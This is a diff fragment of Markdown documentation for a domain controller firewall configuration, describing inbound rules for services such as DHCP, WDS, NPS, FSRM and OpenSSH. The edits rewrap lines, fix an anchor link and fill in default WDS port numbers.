+- [Windows Deployment Services (WDS)](#windows-deployment-services-udp-in)
 - [Key Management Service (KMS)](#key-management-service-tcp-in)
-- [File Server Resource Manager (FSRM)](#remote-file-server-resource-manager-management---fsrm-reports-service-rpc-in)
+- [File Server Resource Manager (FSRM)](#remote-file-server-resource-manager-management---fsrm-service-rpc-in)
 - [Print Spooler](#file-and-printer-sharing-spooler-service---rpc) (highly discouraged)
 - [Windows Server Update Services (WSUS)](#windows-server-update-services-http-in)
 - [OpenSSH SSH Server](#openssh-ssh-server-sshd)
@@ -3006,7 +3836,8 @@ This rule is governed by the [EnableWINS](#enablewins) setting.
 | Description | Inbound rule for the Windows Internet Naming Service to allow remote management via RPC/TCP. |
 | Remote Addresses | [Management Computers](#managementaddresses), [Domain Controllers](#domaincontrolleraddresses) |
 
-This rule is governed by the [EnableWINS](#enablewins) setting. The scope of this rule can further be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
+This rule is governed by the [EnableWINS](#enablewins) setting. The scope of this rule
+can further be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
 
 #### DHCP Server v4 (UDP-In)
 
@@ -3088,7 +3919,8 @@ This rule is governed by the [EnableDhcpServer](#enabledhcpserver) setting.
 
 This rule is governed by the [EnableDhcpServer](#enabledhcpserver) setting.
 
-If the DHCP server role is co-located with the domain controller role, it is highly probable that other DCs are configured in the same way. It would therefore make sense to allow DHCP failover betweeen DCs.
+If the DHCP server role is co-located with the domain controller role, it is highly probable that other DCs
+are configured in the same way. It would therefore make sense to allow DHCP failover betweeen DCs.
 
 #### DHCP Server (RPC-In)
 
@@ -3104,7 +3936,8 @@ If the DHCP server role is co-located with the domain controller role, it is hig
 | Description | An inbound rule to allow traffic to allow RPC traffic for DHCP Server management. |
 | Remote Addresses | [Management Computers](#managementaddresses), [Domain Controllers](#domaincontrolleraddresses) |
 
-This rule is governed by the [EnableDhcpServer](#enabledhcpserver) setting. The scope of this rule can further be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
+This rule is governed by the [EnableDhcpServer](#enabledhcpserver) setting. The scope of this rule
+can further be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
 
 #### Network Policy Server (Legacy RADIUS Authentication - UDP-In)
 
@@ -3183,7 +4016,8 @@ This rule is governed by the [EnableNPS](#enablenps) setting.
 | Description | Inbound rule for the Network Policy Server to be remotely managed via RPC/TCP. |
 | Remote Addresses | [Management Computers](#managementaddresses), [Domain Controllers](#domaincontrolleraddresses) |
 
-This rule is governed by the [EnableNPS](#enablenps) setting. The scope of this rule can further be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
+This rule is governed by the [EnableNPS](#enablenps) setting. The scope of this rule
+can further be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
 
 #### World Wide Web Services (HTTP Traffic-In)
 
@@ -3231,8 +4065,14 @@ This rule is governed by the [EnableWebServer](#enablewebserver) setting.
 
 This rule is governed by the [EnableWDS](#enablewds) setting.
 
-> [!NOTE]
-> TODO: List WDS UDP ports
+The WDS service listens on the following UDP ports by default:
+
+| Port | Description |
+|------|-------------|
+| 67/UDP | DHCP Server (Required if options 66 and 67 are not sent by a standalone DHCP server) |
+| 68/UDP | DHCP Client (Required for DHCP server authorization) |
+| 69/UDP |TFTP |
+| 4011/UDP | DHCP Proxy |
 
 #### Windows Deployment Services (RPC-In)
 
@@ -3248,10 +4088,7 @@ This rule is governed by the [EnableWDS](#enablewds) setting.
 | Description | Inbound rule for Windows Deployment Services to allow RPC/TCP traffic. |
 | Remote Addresses | [Client Computers](#clientaddresses), [Management Computers](#managementaddresses), [Domain Controllers](#domaincontrolleraddresses) |
 
-This rule is governed by the [EnableWDS](#enablewds) setting.
-
-> [!NOTE]
-> TODO: List WDS TCP ports
+This rule is governed by the [EnableWDS](#enablewds) setting. The WDS service uses port `5040/TCP` by default.
 
 #### Key Management Service (TCP-In)
 
@@ -3283,7 +4120,8 @@ This rule is governed by the [EnableKMS](#enablekms) setting.
 | Description | Inbound rule for the File Server Resource Manager service to be remotely managed via RPC/TCP. |
 | Remote Addresses | [Management Computers](#managementaddresses), [Domain Controllers](#domaincontrolleraddresses) |
 
-This rule is governed by the [EnableFSRMManagement](#enablefsrmmanagement) setting. The scope of this rule can further be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
+This rule is governed by the [EnableFSRMManagement](#enablefsrmmanagement) setting. The scope of this rule
+can further be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
 
 #### Remote File Server Resource Manager Management - FSRM Reports Service (RPC-In)
 
@@ -3299,7 +4137,8 @@ This rule is governed by the [EnableFSRMManagement](#enablefsrmmanagement) setti
 | Description | Inbound rule for the File Server Storage Reports Manager service to be remotely managed via RPC/TCP. |
 | Remote Addresses | [Management Computers](#managementaddresses), [Domain Controllers](#domaincontrolleraddresses) |
 
-This rule is governed by the [EnableFSRMManagement](#enablefsrmmanagement) setting. The scope of this rule can further be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
+This rule is governed by the [EnableFSRMManagement](#enablefsrmmanagement) setting. The scope of this rule
+can further be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
 
 #### File and Printer Sharing (Spooler Service - RPC)
 
@@ -3360,4 +4199,5 @@ This rule is governed by the [EnableWSUS](#enablewsus) setting.
 | Description | Inbound rule for OpenSSH SSH Server (sshd) |
 | Remote Addresses | [Management Computers](#managementaddresses), [Domain Controllers](#domaincontrolleraddresses) |
 
-This rule is governed by the [EnableOpenSSHServer](#enableopensshserver) setting. The scope of this rule can further be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
+This rule is governed by the [EnableOpenSSHServer](#enableopensshserver) setting. The scope of this rule can further
+be limited by enabling the [BlockManagementFromDomainControllers](#blockmanagementfromdomaincontrollers) setting.
